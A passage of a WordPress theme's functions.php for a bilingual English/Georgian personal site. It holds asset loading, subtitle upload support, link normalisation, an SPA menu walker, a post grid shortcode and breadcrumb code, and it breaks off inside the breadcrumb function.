<?php
/**
 * functions.php — Zurab Kostava theme
 */

if ( ! defined( 'ABSPATH' ) ) {
    exit; // No direct access.
}

require_once get_template_directory() . '/inc/platform/languages.php';
require_once get_template_directory() . '/inc/language-manager.php';
require_once get_template_directory() . '/inc/platform/language-center.php';
require_once get_template_directory() . '/inc/visual-hub-admin.php';
require_once get_template_directory() . '/inc/platform/assets.php';
require_once get_template_directory() . '/inc/platform/security.php';
require_once get_template_directory() . '/inc/platform/blog-categories.php';
require_once get_template_directory() . '/inc/platform/projects.php';
require_once get_template_directory() . '/inc/platform/books.php';
// 🔴 Load Nuvio Addons
require_once get_template_directory() . '/nuvio-ge-sub.php';
require_once get_template_directory() . '/nuvio-movies-addon.php';

function zk_setup() {
    add_theme_support( 'title-tag' );
    add_theme_support( 'post-thumbnails' );
    add_theme_support( 'html5', array( 'style', 'script', 'navigation-widgets' ) );
    add_theme_support( 'automatic-feed-links' );
}
add_action( 'after_setup_theme', 'zk_setup' );

// 🔴 Allow uploading Subtitles (.srt, .vtt)
function zk_allow_subtitle_uploads( $mimes ) {
    $mimes['srt'] = 'text/plain';
    $mimes['vtt'] = 'text/vtt';
    return $mimes;
}
add_filter( 'upload_mimes', 'zk_allow_subtitle_uploads' );

// 🔴 Bypass strict MIME type checking for subtitles
function zk_allow_subtitle_check( $data, $file, $filename, $mimes ) {
    $ext = pathinfo( $filename, PATHINFO_EXTENSION );
    if ( 'srt' === $ext ) {
        $data['ext']  = 'srt';
        $data['type'] = 'text/plain';
    } elseif ( 'vtt' === $ext ) {
        $data['ext']  = 'vtt';
        $data['type'] = 'text/vtt';
    }
    return $data;
}
add_filter( 'wp_check_filetype_and_ext', 'zk_allow_subtitle_check', 10, 4 );

function zk_resource_hints( $hints, $relation_type ) {
    if ( 'preconnect' === $relation_type ) {
        $hints[] = 'https://fonts.googleapis.com';
        $hints[] = array( 'href' => 'https://fonts.gstatic.com', 'crossorigin' => 'anonymous' );
    }
    return $hints;
}
add_filter( 'wp_resource_hints', 'zk_resource_hints', 10, 2 );

function zk_assets() {
    wp_enqueue_style( 'zk-fonts', 'https://fonts.googleapis.com/css2?family=Google+Sans:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700&family=Noto+Sans+Georgian:wght@300;400;500;600;700&display=swap', array(), null );

    // CSS-ის მიბმა
    wp_enqueue_style( 'zk-style', get_stylesheet_uri(), array( 'zk-fonts' ), zk_asset_version( 'style.css' ) );

    // Three.js for 3D Galaxy background
    wp_enqueue_script( 'three-js', 'https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js', array(), '128', true );

    // ახალი app.js ფაილის მიბმა სუფთად
    wp_enqueue_script( 'zk-galaxy-bg', get_stylesheet_directory_uri() . '/galaxy-bg.js', array('three-js'), filemtime( get_stylesheet_directory() . '/galaxy-bg.js' ), true );
    wp_enqueue_script( 'zk-analytics', get_stylesheet_directory_uri() . '/analytics.js', array(), filemtime( get_stylesheet_directory() . '/analytics.js' ), true );
    wp_enqueue_script( 'zk-app', get_stylesheet_directory_uri() . '/app.js', array('zk-galaxy-bg', 'zk-analytics'), filemtime( get_stylesheet_directory() . '/app.js' ), true );

    // Download the interactive layer while HTML is still being parsed, but keep
    // dependency order intact. This lets the first page content paint without
    // waiting for Three.js and the full galaxy program to execute.
    foreach ( array( 'three-js', 'zk-galaxy-bg', 'zk-analytics', 'zk-app' ) as $deferred_handle ) {
        wp_script_add_data( $deferred_handle, 'strategy', 'defer' );
    }

    // აქ ვაწვდით დინამიურ ლინკებს
    $language_data = array();
    if ( function_exists( 'zk_get_languages' ) ) {
        foreach ( zk_get_languages() as $code => $language ) {
            $language_data[] = array(
                'code'   => $code,
                'locale' => $language['locale'],
                'prefix' => $language['prefix'],
            );
        }
    }
    wp_localize_script( 'zk-analytics', 'ZK', array(
            'home' => home_url( '/' ),
            'site' => get_bloginfo( 'name' ),
            'languages' => $language_data,
    ) );
}
add_action( 'wp_enqueue_scripts', 'zk_assets' );

/**
 * Return a direct, canonical internal destination for links stored in custom
 * fields. This removes avoidable 301 hops when editors omit a trailing slash.
 */
function zk_normalize_internal_destination( $url ) {
    $url = trim( (string) $url );
    if ( '' === $url ) {
        return '';
    }

    $parts     = wp_parse_url( $url );
    if ( ! is_array( $parts ) || ( isset( $parts['scheme'] ) && ! in_array( strtolower( $parts['scheme'] ), array( 'http', 'https' ), true ) ) ) {
        return $url;
    }
    $home_host = strtolower( (string) wp_parse_url( home_url( '/' ), PHP_URL_HOST ) );
    $url_host  = strtolower( (string) ( $parts['host'] ?? '' ) );

    if ( $url_host && $home_host && $url_host !== $home_host ) {
        return $url;
    }

    $path = (string) ( $parts['path'] ?? '' );
    if ( '/blog/zk_book/beta/' === trailingslashit( $path ) ) {
        $path = '/books/beta/';
    } elseif ( 0 === strpos( $path, '/' ) && '/' !== $path && ! pathinfo( $path, PATHINFO_EXTENSION ) ) {
        $path = trailingslashit( $path );
    }

    if ( $url_host ) {
        $normalized = ( $parts['scheme'] ?? 'https' ) . '://' . $parts['host'];
        if ( isset( $parts['port'] ) ) {
            $normalized .= ':' . (int) $parts['port'];
        }
        $normalized .= $path;
    } else {
        $normalized = $path;
    }

    if ( isset( $parts['query'] ) ) {
        $normalized .= '?' . $parts['query'];
    }
    if ( isset( $parts['fragment'] ) ) {
        $normalized .= '#' . $parts['fragment'];
    }

    return $normalized;
}

/**
 * Repair a small set of legacy links still stored inside old post content.
 */
function zk_fix_legacy_internal_content_links( $content ) {
    if ( is_admin() || ! is_string( $content ) || '' === $content ) {
        return $content;
    }

    $is_ka = function_exists( 'zk_get_current_language' ) && 'ka' === zk_get_current_language();
    $encrolib_url = home_url( $is_ka ? '/ka/projects/encrolib/' : '/projects/encrolib/' );
    $book_url     = home_url( $is_ka ? '/ka/books/beta/' : '/books/beta/' );

    $replacements = array(
        'href="https://zurabkostava.com/projects/encrolib"' => 'href="' . esc_url( $encrolib_url ) . '"',
        "href='https://zurabkostava.com/projects/encrolib'" => "href='" . esc_url( $encrolib_url ) . "'",
        'href="https://zurabkostava.com/blog/zk_book/beta/"' => 'href="' . esc_url( $book_url ) . '"',
        "href='https://zurabkostava.com/blog/zk_book/beta/'" => "href='" . esc_url( $book_url ) . "'",
    );

    // Old custom-field HTML can contain a language home URL without its slash.
    // Match complete href values only; leave external links and deeper paths alone.
    $site_home = untrailingslashit( get_option( 'home' ) );
    foreach ( zk_get_translatable_languages() as $language ) {
        $prefix = trim( $language['prefix'], '/' );
        if ( '' === $prefix ) {
            continue;
        }
        $legacy_home = $site_home . '/' . $prefix;
        foreach ( array( '"', "'" ) as $quote ) {
            $replacements[ 'href=' . $quote . $legacy_home . $quote ] = 'href=' . $quote . esc_url( $legacy_home . '/' ) . $quote;
        }
    }

    return strtr( $content, $replacements );
}
add_filter( 'the_content', 'zk_fix_legacy_internal_content_links', 25 );

/**
 * Shortcodes can generate target=_blank links after WordPress' own link-rel
 * filter has run. Add the protection once more to the completed page content.
 */
function zk_secure_rendered_target_blank_links( $content ) {
    if ( is_admin() || ! is_string( $content ) || ! preg_match( '/\btarget\s*=/i', $content ) ) {
        return $content;
    }

    return preg_replace_callback(
        '/<a\b([^>]*)>/i',
        static function ( $matches ) {
            $attributes = $matches[1];
            if ( ! preg_match( '/\btarget\s*=\s*(["\'])_blank\1/i', $attributes ) ) {
                return $matches[0];
            }

            if ( preg_match( '/\brel\s*=\s*(["\'])(.*?)\1/i', $attributes, $rel_match ) ) {
                $tokens = preg_split( '/\s+/', trim( $rel_match[2] ) );
                $tokens = array_filter( array_unique( array_merge( $tokens, array( 'noopener', 'noreferrer' ) ) ) );
                $secure_rel = 'rel=' . $rel_match[1] . implode( ' ', $tokens ) . $rel_match[1];
                $attributes = preg_replace( '/\brel\s*=\s*(["\'])(.*?)\1/i', $secure_rel, $attributes, 1 );
            } else {
                $attributes .= ' rel="noopener noreferrer"';
            }

            return '<a' . $attributes . '>';
        },
        $content
    );
}
add_filter( 'the_content', 'zk_secure_rendered_target_blank_links', 99 );

// 🔴 Bypass WP Rocket Delay JS for app.js and analytics.js so tracking fires immediately
add_filter( 'rocket_delay_js_exclusions', function( $exclusions ) {
    $exclusions[] = 'app.js';
    $exclusions[] = 'analytics.js';
    return $exclusions;
} );

// 🔴 Bypass WP Rocket Delay JS for app.js so tracking fires immediately
add_filter( 'script_loader_tag', function( $tag, $handle ) {
    if ( in_array( $handle, array( 'zk-app', 'zk-analytics', 'three-js', 'zk-galaxy-bg' ), true ) ) {
        $attributes = 'data-no-optimize="1" ';
        if ( false === strpos( $tag, ' defer' ) ) {
            $attributes .= 'defer ';
        }
        return str_replace( '<script ', '<script ' . $attributes, $tag );
    }
    return $tag;
}, 10, 2 );

// Google Fonts use font-display:swap, so their stylesheet does not need to
// block the first paint. The same fonts and weights still replace the fallback
// as soon as the stylesheet is ready; noscript preserves the no-JS fallback.
add_filter( 'style_loader_tag', function( $html, $handle ) {
    if ( 'zk-fonts' !== $handle ) {
        return $html;
    }

    $non_blocking = preg_replace(
        '/media=([\'\"])all\\1/',
        'media=$1print$1 onload="this.media=\'all\'"',
        $html,
        1
    );

    if ( ! is_string( $non_blocking ) || $non_blocking === $html ) {
        $non_blocking = str_replace(
            '<link ',
            '<link media="print" onload="this.media=\'all\'" ',
            $html
        );
    }

    return $non_blocking . '<noscript>' . $html . '</noscript>';
}, 10, 2 );

function zk_register_menus() {
    register_nav_menu('primary-menu', 'Primary Header Menu');
}
add_action('init', 'zk_register_menus');

/**
 * SPA route map — DYNAMIC VERSION.
 * იღებს WordPress-ში შექმნილ ყველა გვერდს ავტომატურად.
 */
function zk_routes() {
    $routes = array(
            '/' => array( 'slug' => null, 'label' => 'Home', 'eyebrow' => '' ),
    );

    $pages = get_pages( array( 'post_status' => 'publish' ) );
    foreach ( $pages as $page ) {
        $path = '/' . get_page_uri( $page );
        $routes[ $path ] = array(
                'slug'    => $page->post_name,
                'label'   => $page->post_title,
                'eyebrow' => get_post_meta( $page->ID, 'zk_eyebrow', true ) ?: 'Z.K — ' . $page->post_title,
        );
    }
    return $routes;
}

// ============================================================
// GLOBAL MOBILE UX FIX: KILL ANDROID CHROME TAP HIGHLIGHT
// ============================================================
function zk_global_mobile_ux_fix() {
    ?>
    <style id="zk-global-mobile-fix">
        html, body, * {
            -webkit-tap-highlight-color: transparent !important;
            -webkit-tap-highlight-color: rgba(0,0,0,0) !important;
        }
        /* Make sure buttons don't have default focus outlines on touch */
        a, button, input, select, textarea {
            outline: none !important;
        }
    </style>
    <?php
}
add_action('wp_head', 'zk_global_mobile_ux_fix', 999);

/**
 * SPA Menu Walker.
 * გარდაქმნის WP-ის სტანდარტულ მენიუს შენს Custom SPA HTML სტრუქტურად.
 */
/**
 * SPA Menu Walker - Supports Nested Dropdowns
 */
class ZK_SPA_Walker extends Walker_Nav_Menu {
    public function start_lvl( &$output, $depth = 0, $args = null ) {
        // თუ მეორე დონეა (ან უფრო ღრმა), ვამატებთ nested-menu კლასს
        $class = $depth >= 1 ? 'dropdown-menu nested-menu' : 'dropdown-menu';
        $output .= '<ul class="' . esc_attr( $class ) . '">';
    }

    public function start_el( &$output, $item, $depth = 0, $args = null, $id = 0 ) {
        $classes = empty( $item->classes ) ? array() : (array) $item->classes;
        $has_children = in_array( 'menu-item-has-children', $classes );

        $li_classes = array();
        if ( $depth === 0 ) {
            $li_classes[] = 'nav-item';
            if ( $has_children ) $li_classes[] = 'has-dropdown';
        } else {
            // მეორადი ჩაშლის კლასები
            $li_classes[] = 'nested-item';
            if ( $has_children ) $li_classes[] = 'has-nested-dropdown';
        }

        $class_names = join( ' ', array_filter( $li_classes ) );
        $class_names = $class_names ? ' class="' . esc_attr( $class_names ) . '"' : '';

        $output .= '<li' . $class_names . '>';

        $url = ! empty( $item->url ) ? $item->url : '';
        $site_host = parse_url( get_option('home'), PHP_URL_HOST );
        $url_host  = parse_url( $url, PHP_URL_HOST );
        $is_external = ( ! empty( $url_host ) && $url_host !== $site_host );

        if ( ! $is_external && function_exists('zk_get_current_language') && zk_get_current_language() === 'ka' && function_exists('zk_filter_permalink_ka') ) {
            $url = zk_filter_permalink_ka( $url );
        }

        $parsed = wp_parse_url( $url );
        $path = isset( $parsed['path'] ) ? rtrim( $parsed['path'], '/' ) : '/';
        if ( empty( $path ) ) $path = '/';

        $link_class = ( $depth === 0 ) ? 'nav-link' : 'dropdown-link';
        if ( $is_external ) {
            $link_class .= ' no-spa';
        }
        if ( 'zk_tool' === $item->object && get_post_meta( $item->object_id, '_zk_project_path', true ) && 'detail' !== get_post_meta( $item->object_id, '_zk_project_app', true ) ) $link_class .= ' no-spa';
        if ( 'zk_book' === $item->object && get_post_meta( $item->object_id, '_zk_book_path', true ) ) $link_class .= ' no-spa';

        $is_current = in_array( 'current-menu-item', $classes ) || in_array( 'current-page-item', $classes );
        if ( $is_current ) $link_class .= ' is-current';

        $item_title = $item->title;
        if ( function_exists('zk_get_current_language') && zk_get_current_language() !== 'en' && ! empty( $item->object_id ) ) {
            if ( in_array( $item->type, array( 'post_type', 'post_type_archive' ) ) ) {
                $ka_title = get_post_meta( $item->object_id, zk_language_meta_key( 'title', zk_get_current_language() ), true );
                if ( ! empty( $ka_title ) ) {
                    $item_title = $ka_title;
                }
            } elseif ( $item->type === 'taxonomy' ) {
                $ka_title = get_term_meta( $item->object_id, zk_language_meta_key( 'name', zk_get_current_language() ), true );
                if ( ! empty( $ka_title ) ) {
                    $item_title = $ka_title;
                }
            }
        }

        if ( function_exists('zk_uppercase_ka') && ( ( function_exists('zk_get_current_language') && zk_get_current_language() === 'ka' ) || preg_match( '/[\x{10D0}-\x{10FA}]/u', $item_title ) ) ) {
            $item_title = zk_uppercase_ka( $item_title );
        }

        $route_attr = $is_external ? '' : ' data-route="' . esc_attr( $path ) . '"';

        // ლინკი ჩაშლისთვის (გახდა კლიკებადი)
        if ( $has_children ) {
            $link_class .= ' dropdown-trigger';
            $aria = $is_current ? ' aria-current="page"' : '';
            $output .= '<a class="' . esc_attr( $link_class ) . '"' . $route_attr . ' href="' . esc_url( $url ) . '" aria-haspopup="true" aria-expanded="false"' . $aria . '>';
            $output .= esc_html( $item_title );

            // მეორად ჩაშლას ოდნავ სხვა ისარი სჭირდება (მარჯვნივ მიმართული)
            $caret_class = $depth >= 1 ? 'dropdown-caret nested-caret' : 'dropdown-caret';
            $output .= '<svg class="' . esc_attr( $caret_class ) . '" width="11" height="11" viewBox="0 0 12 12" fill="none" aria-hidden="true"><path d="M2.5 4.5L6 8L9.5 4.5" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/></svg>';
            $output .= '</a>';
        } else {
            // ჩვეულებრივი ლინკი
            $aria = $is_current ? ' aria-current="page"' : '';

            // ვითვალისწინებთ WordPress-ის "Open in new tab" პარამეტრს
            $target_attr = ! empty( $item->target ) ? $item->target : ( $is_external ? '_blank' : '' );
            $target_html = ! empty( $target_attr ) ? ' target="' . esc_attr( $target_attr ) . '" rel="noopener noreferrer"' : '';

            $output .= '<a class="' . esc_attr( $link_class ) . '"' . $route_attr . ' href="' . esc_url( $url ) . '"' . $aria . $target_html . '>';
            $output .= esc_html( $item_title );

            // თუ გარე ლინკია ან ახალ ტაბში იხსნება, ვამატებთ მინიმალისტურ ისრის იკონს
            if ( $target_attr === '_blank' ) {
                $output .= '<svg class="zk-external-icon" width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" aria-hidden="true"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg>';
            }

            $output .= '</a>';
        }
    }
}

/**
 * Smart Custom Grid for Posts (Updated with Sorting UI and Time Data)
 */
function zk_custom_post_grid( $atts ) {
    $atts = shortcode_atts( array(
            'category' => '',
    ), $atts, 'custom_grid' );

    $args = array(
            'posts_per_page' => -1,
            'post_status'    => 'publish',
            'no_found_rows'  => true
    );

    if ( ! empty( $atts['category'] ) ) {
        $args['category_name'] = sanitize_text_field( $atts['category'] );
    }

    $query = new WP_Query( $args );

    $is_ka = function_exists( 'zk_get_current_language' ) ? ( zk_get_current_language() === 'ka' ) : false;
    if ( ! $is_ka ) {
        $req_uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
        if ( strpos( $req_uri, '/ka/' ) === 0 || strpos( $req_uri, '/ka' ) === 0 ) {
            $is_ka = true;
        }
    }

    if ( ! $query->have_posts() ) {
        return '<p class="page__content">' . ( $is_ka ? 'პოსტები ამ კატეგორიაში არ მოიძებნა.' : 'No posts found in this category.' ) . '</p>';
    }

    $search_placeholder = $is_ka ? 'ძებნა...' : 'Search projects...';
    $sort_label         = $is_ka ? ( function_exists( 'zk_uppercase_ka' ) ? zk_uppercase_ka( 'სორტირება: ' ) : 'სორტირება: ' ) : 'Sort by: ';
    $newest_text        = $is_ka ? ( function_exists( 'zk_uppercase_ka' ) ? zk_uppercase_ka( 'უახლესი' ) : 'უახლესი' ) : 'Newest';
    $oldest_text        = $is_ka ? ( function_exists( 'zk_uppercase_ka' ) ? zk_uppercase_ka( 'უძველესი' ) : 'უძველესი' ) : 'Oldest';

    // მთავარი კონტეინერი (Wrapper)
    $output = '<div class="zk-grid-wrapper">';

    // ფილტრაციის კონტროლები (მყისიერი ძებნა + სორტირება)
    $output .= '<div class="zk-grid-controls">';

    // პრემიუმ შიდა ძებნის ინპუტი (Glass Design)
    $output .= '<div class="zk-search-box">';
    $output .= '<input type="text" class="zk-search-input" placeholder="' . esc_attr( $search_placeholder ) . '" aria-label="' . esc_attr( $search_placeholder ) . '">';
    $output .= '<svg class="zk-search-icon" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>';
    $output .= '</div>';

    // სორტირების Custom Dropdown
    $output .= '<div class="zk-sort-dropdown" id="sortDropdown">';
    $output .= '<button class="zk-sort-trigger" type="button" aria-expanded="false">';
    $output .= '<span class="zk-sort-label">' . esc_html( $sort_label ) . '</span><span class="zk-sort-current">' . esc_html( $newest_text ) . '</span>';
    $output .= '<svg class="dropdown-caret" width="10" height="10" viewBox="0 0 12 12" fill="none" aria-hidden="true"><path d="M2.5 4.5L6 8L9.5 4.5" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/></svg>';
    $output .= '</button>';
    $output .= '<div class="zk-sort-menu">';
    $output .= '<button class="zk-sort-option is-selected" type="button" data-sort="desc">' . esc_html( $newest_text ) . '</button>';
    $output .= '<button class="zk-sort-option" type="button" data-sort="asc">' . esc_html( $oldest_text ) . '</button>';
    $output .= '</div>'; // end menu
    $output .= '</div>'; // end dropdown
    $output .= '</div>'; // end controls

    // უშუალოდ გრიდი
    $output .= '<div class="zk-post-grid">';

    while ( $query->have_posts() ) {
        $query->the_post();

        $title = get_the_title();
        $link = get_permalink();
        $path = wp_parse_url( $link, PHP_URL_PATH );

        $categories = get_the_category();
        $cat_name = ! empty( $categories ) ? esc_html( function_exists( 'zk_get_translated_term_name' ) ? zk_get_translated_term_name( $categories[0] ) : $categories[0]->name ) : 'Post';
        if ( function_exists( 'zk_uppercase_ka' ) && ( $is_ka || preg_match( '/[\x{10D0}-\x{10FA}]/u', $cat_name ) ) ) {
            $cat_name = zk_uppercase_ka( $cat_name );
        }

        $date = get_the_date( 'M j, Y' );
        // ვიღებთ პოსტის გამოქვეყნების ზუსტ წამებს, რათა JS-მა სორტირება შეძლოს
        $timestamp = get_the_time( 'U' );

        $img_url = has_post_thumbnail() ? get_the_post_thumbnail_url( get_the_ID(), 'large' ) : '';
        // ქარდს ვუმატებთ data-time ატრიბუტს
        $output .= '<a href="' . esc_url( $link ) . '" class="zk-grid-card" data-route="' . esc_attr( $path ) . '" data-time="' . esc_attr( $timestamp ) . '">';
        $output .= '<div class="zk-card-image">';
        if ( $img_url ) {
            $output .= wp_get_attachment_image( get_post_thumbnail_id(), 'large', false, array(
                'loading' => 'lazy', 'decoding' => 'async',
                'alt' => $title, 'class' => 'zk-card-img',
                'sizes' => '(max-width: 767px) calc(100vw - 40px), (max-width: 1024px) 50vw, 420px',
            ) );
        }
        $output .= '</div>';
        $output .= '<div class="zk-card-content">';

        $output .= '<div class="zk-card-meta">';
        $output .= '<span class="zk-card-category">' . $cat_name . '</span>';
        $output .= '<span class="zk-card-meta-separator"></span>';
        $output .= '<span class="zk-card-date">' . esc_html( $date ) . '</span>';
        $output .= '</div>';

        $output .= '<h2 class="zk-card-title">' . $title . '</h2>';
        $output .= '</div>';
        $output .= '</a>';
    }

    wp_reset_postdata();
    $output .= '</div>'; // იხურება zk-post-grid
    $output .= '</div>'; // იხურება zk-grid-wrapper

    return $output;
}
add_shortcode( 'custom_grid', 'zk_custom_post_grid' );


/* ============================================================
   WP HEAD & FOOTER CLEANUP (მაქსიმალური მინიმალიზმი)
   ============================================================ */
function zk_clean_wp_head() {
    // 1. ემოჯების ამოშლა
    remove_action( 'wp_head', 'print_emoji_detection_script', 7 );
    remove_action( 'admin_print_scripts', 'print_emoji_detection_script' );
    remove_action( 'wp_print_styles', 'print_emoji_styles' );
    remove_action( 'admin_print_styles', 'print_emoji_styles' );
    remove_filter( 'the_content_feed', 'wp_staticize_emoji' );
    remove_filter( 'comment_text_rss', 'wp_staticize_emoji' );
    remove_filter( 'wp_mail', 'wp_staticize_emoji_for_email' );

    // 2. RSS Feeds-ის ამოშლა
    remove_action( 'wp_head', 'feed_links_extra', 3 );
    remove_action( 'wp_head', 'feed_links', 2 );

    // 3. oEmbed და REST API ლინკების ამოშლა (თუ ვინმე არ აემბედებს შენს საიტს)
    remove_action( 'wp_head', 'wp_oembed_add_discovery_links' );
    remove_action( 'wp_head', 'wp_oembed_add_host_js' );
    remove_action( 'wp_head', 'rest_output_link_wp_head', 10 );

    // 4. Shortlink-ისა და WP Generator-ის (ვერსიის) ამოშლა
    remove_action( 'wp_head', 'wp_shortlink_wp_head', 10, 0 );
    remove_action( 'wp_head', 'wp_generator' );
    // 6. Global Styles-ის და SVG ფილტრების სრული განადგურება (ახალი WP ვერსიებისთვის)
    remove_action( 'wp_enqueue_scripts', 'wp_enqueue_global_styles' );
    remove_action( 'wp_body_open', 'wp_global_styles_render_svg_filters' );
}
add_action( 'init', 'zk_clean_wp_head' );

// 5. Gutenberg-ის სტილების, Global Styles-ის და Classic Theme CSS-ის ამოშლა
function zk_remove_wp_block_library_css() {
    wp_dequeue_style( 'wp-block-library' );
    wp_dequeue_style( 'wp-block-library-theme' );
    wp_dequeue_style( 'global-styles' );
    wp_dequeue_style( 'classic-theme-styles' );
}
add_action( 'wp_enqueue_scripts', 'zk_remove_wp_block_library_css', 100 );

/* ============================================================
   BREADCRUMBS (ნავიგაციის ბილიკი) - SPA & Page Hierarchy თავსებადი
   ============================================================ */
/**
 * Helper to get localized and Mtavruli breadcrumb crumb label
 */
function zk_get_breadcrumb_crumb_label( $title, $slug = '', $post_id = 0, $is_ka = false ) {
    if ( ! $is_ka ) {
        return $title;
    }

    $slug_clean  = strtolower( trim( (string) $slug ) );
    $title_clean = strtolower( trim( (string) $title ) );

    // 1. Check post meta if post_id provided
    if ( $post_id ) {
        $meta = get_post_meta( $post_id, '_zk_title_ka', true );
        if ( ! empty( $meta ) ) {
            return function_exists( 'zk_uppercase_ka' ) ? zk_uppercase_ka( $meta ) : $meta;
        }
    }

    // 2. Comprehensive slug and common title dictionary for Georgian site
    static $dict = array(
        'blog'         => 'ბლოგი',
        'raw'          => 'გაუფილტრავი',
        'news'         => 'სიახლეები',
        'reviews'      => 'მიმოხილვები',
        'aubades'      => 'გარიჟრაჟები',
        'nocturnes'    => 'ნოქტიურნები',
        'about'        => 'შესახებ',
        'projects'     => 'პროექტები',
        'music'        => 'მუსიკა',
        'visual'       => 'ვიზუალი',
        'photography'  => 'ფოტოგრაფია',
        'video'        => 'ვიდეო და კინო',
        'graphic'      => 'გრაფიკული დიზაინი',
        'paint'        => 'ფერწერა და არტი',
        'books'        => 'წიგნები',
        'home'         => 'მთავარი',
    );

    if ( ! empty( $slug_clean ) && isset( $dict[ $slug_clean ] ) ) {
        $translated = $dict[ $slug_clean ];
    } elseif ( ! empty( $title_clean ) && isset( $dict[ $title_clean ] ) ) {
        $translated = $dict[ $title_clean ];
    } else {
        $translated = $title;
    }

    return function_exists( 'zk_uppercase_ka' ) ? zk_uppercase_ka( $translated ) : $translated;
}

/**
 * Helper to get localized and Mtavruli breadcrumb term label
 */
function zk_get_breadcrumb_term_label( $term, $is_ka = false ) {
    if ( empty( $term ) ) {
        return '';
    }
    if ( is_numeric( $term ) ) {
        $term = get_term( (int) $term );
    }
    if ( ! is_object( $term ) || is_wp_error( $term ) ) {
        return '';
    }

    if ( ! $is_ka ) {
        return $term->name;
    }

    $name       = function_exists( 'zk_get_translated_term_name' ) ? zk_get_translated_term_name( $term ) : $term->name;
    $slug       = strtolower( trim( (string) $term->slug ) );
    $name_lower = strtolower( trim( (string) $name ) );

    static $dict = array(
        'blog'         => 'ბლოგი',
        'raw'          => 'გაუფილტრავი',
        'news'         => 'სიახლეები',
        'reviews'      => 'მიმოხილვები',
        'aubades'      => 'გარიჟრაჟები',
        'nocturnes'    => 'ნოქტიურნები',
    );

    if ( isset( $dict[ $slug ] ) && ( empty( $name ) || $name_lower === $slug || $name_lower === strtolower( $term->name ) || $name_lower === 'raw' || $name_lower === 'დილის სიმღერები' || $name_lower === 'დილისპირულები' || $name_lower === 'ძილისპირულები' ) ) {
        $name = $dict[ $slug ];
    } elseif ( isset( $dict[ $name_lower ] ) ) {
        $name = $dict[ $name_lower ];
    }

    return function_exists( 'zk_uppercase_ka' ) ? zk_uppercase_ka( $name ) : $name;
}

function zk_breadcrumbs() {
    if ( is_front_page() ) {
        return;
    }

    $is_ka      = ( function_exists( 'zk_get_current_language' ) && zk_get_current_language() === 'ka' );
    $home_route = zk_get_language_path( '/', zk_get_current_language() );
    $home_label = $is_ka ? 'მთავარი' : 'Home';

    echo '<nav class="zk-breadcrumbs" aria-label="Breadcrumb">';

    // 1. Home Link (მინიმალისტური იკონი)
    echo '<a href="' . esc_url( home_url( $home_route ) ) . '" data-route="' . esc_attr( $home_route ) . '" aria-label="' . esc_attr( $home_label ) . '" class="zk-home-link">';
    echo '<svg class="zk-home-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><polyline points="9 22 9 12 15 12 15 22"></polyline></svg>';
    echo '<span class="screen-reader-text">' . esc_html( $home_label ) . '</span>';
    echo '</a>';

    if ( is_singular( 'zk_book' ) ) {
        // --- ლოგიკა წიგნების პოსტებისთვის ---
        $books_label = zk_get_breadcrumb_crumb_label( 'Books', 'books', 0, $is_ka );
        $books_route = $is_ka ? '/ka/books' : '/books';
        $books_url   = $is_ka ? home_url( '/ka/books/' ) : home_url( '/books/' );

        echo '<span class="zk-breadcrumb-separator">/</span>';
        echo '<a href="' . esc_url( $books_url ) . '" data-route="' . esc_attr( $books_route ) . '">' . esc_html( $books_label ) . '</a>';

        $book_title = $is_ka ? ( get_post_meta( get_the_ID(), '_zk_title_ka', true ) ?: get_the_title() ) : get_the_title();
        if ( $is_ka && function_exists( 'zk_uppercase_ka' ) ) {
            $book_title = zk_uppercase_ka( $book_title );
        }
        echo '<span class="zk-breadcrumb-separator">/</span>';
        echo '<span class="zk-breadcrumb-current">' . esc_html( $book_title ) . '</span>';

    } elseif ( is_singular( 'zk_music_release' ) ) {
        // --- ლოგიკა მუსიკალური რელიზებისთვის ---
        $music_label = zk_get_breadcrumb_crumb_label( 'Music', 'music', 0, $is_ka );
        $music_route = $is_ka ? '/ka/music' : '/music';
        $music_url   = $is_ka ? home_url( '/ka/music/' ) : home_url( '/music/' );

        echo '<span class="zk-breadcrumb-separator">/</span>';
        echo '<a href="' . esc_url( $music_url ) . '" data-route="' . esc_attr( $music_route ) . '">' . esc_html( $music_label ) . '</a>';

        $music_title = $is_ka ? ( get_post_meta( get_the_ID(), '_zk_title_ka', true ) ?: get_the_title() ) : get_the_title();
        if ( $is_ka && function_exists( 'zk_uppercase_ka' ) ) {
            $music_title = zk_uppercase_ka( $music_title );
        }
        echo '<span class="zk-breadcrumb-separator">/</span>';
        echo '<span class="zk-breadcrumb-current">' . esc_html( $music_title ) . '</span>';

    } elseif ( is_singular( 'zk_tool' ) ) {
        $projects_url = home_url( zk_get_language_path( '/projects/', zk_get_current_language() ) );
        echo '<span class="zk-breadcrumb-separator">/</span><a href="' . esc_url( $projects_url ) . '" data-route="' . esc_attr( untrailingslashit( wp_parse_url( $projects_url, PHP_URL_PATH ) ) ) . '">' . esc_html( zk_get_breadcrumb_crumb_label( 'Projects', 'projects', 0, $is_ka ) ) . '</a>';
        echo '<span class="zk-breadcrumb-separator">/</span><span class="zk-breadcrumb-current">' . esc_html( get_the_title() ) . '</span>';
    } elseif ( is_single() ) {
        // --- ლოგიკა ცალკეული ბლოგ-პოსტებისთვის (მაგ: Nocturne #50) ---
        $blog_label = zk_get_breadcrumb_crumb_label( 'Blog', 'blog', 0, $is_ka );
        $blog_route = $is_ka ? '/ka/blog' : '/blog';
        $blog_url   = $is_ka ? home_url( '/ka/blog/' ) : home_url( '/blog/' );

        echo '<span class="zk-breadcrumb-separator">/</span>';
        echo '<a href="' . esc_url( $blog_url ) . '" data-route="' . esc_attr( $blog_route ) . '">' . esc_html( $blog_label ) . '</a>';

        $categories = get_the_category();
